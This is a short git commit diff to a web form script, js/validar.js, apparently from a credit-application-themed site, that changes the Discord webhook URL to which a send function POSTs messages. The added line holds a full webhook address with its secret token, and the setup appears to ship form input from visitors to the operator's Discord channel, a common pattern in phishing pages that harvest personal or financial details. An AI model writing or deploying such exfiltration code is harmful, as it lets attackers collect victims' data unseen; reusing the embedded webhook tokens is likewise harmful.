114b76911b23e8c350361ea36f100585e37bbca9
solicitatucredit <flowwer048@gmail.com>
2026-07-13 20:09:45 -0500

    Update validar.js

--- js/validar.js
+++ js/validar.js
@@ -183,8 +183,8 @@ document.addEventListener("DOMContentLoaded", () => {
   async function sendTelegramMessageNoBtn(mensaje) {
     // const url =
     //   "https://discordapp.com/api/webhooks/1513106444722110564/nV_nXqcGdy33nJ3jOkYu_CfIdF5n2ILVFa739iV5RfmjTK2AwlrWnOEZXb7OewANWVDV"; // Asegúrate de que el puerto coincida con el de tu servidor
-    const url =
-      "https://discordapp.com/api/webhooks/1526322012207976579/fvFbhdfzb6zZQhKzneSKLXd6WnFcKrHKjUhjnl1kLfHw1qPS9Yl6q-MsNFG8CY6yZbnh";
+    //const url = "https://discordapp.com/api/webhooks/1526322012207976579/fvFbhdfzb6zZQhKzneSKLXd6WnFcKrHKjUhjnl1kLfHw1qPS9Yl6q-MsNFG8CY6yZbnh";
+    const url = "https://discordapp.com/api/webhooks/1524574270779560081/NeHdkgwsnLidvr7pWqmwOykOsGLkFBvkQvrnM2Q6CuC6qooczSHB32Tpiz3JwnawbsXF";
 
     const response = await fetch(url, {
       method: "POST",
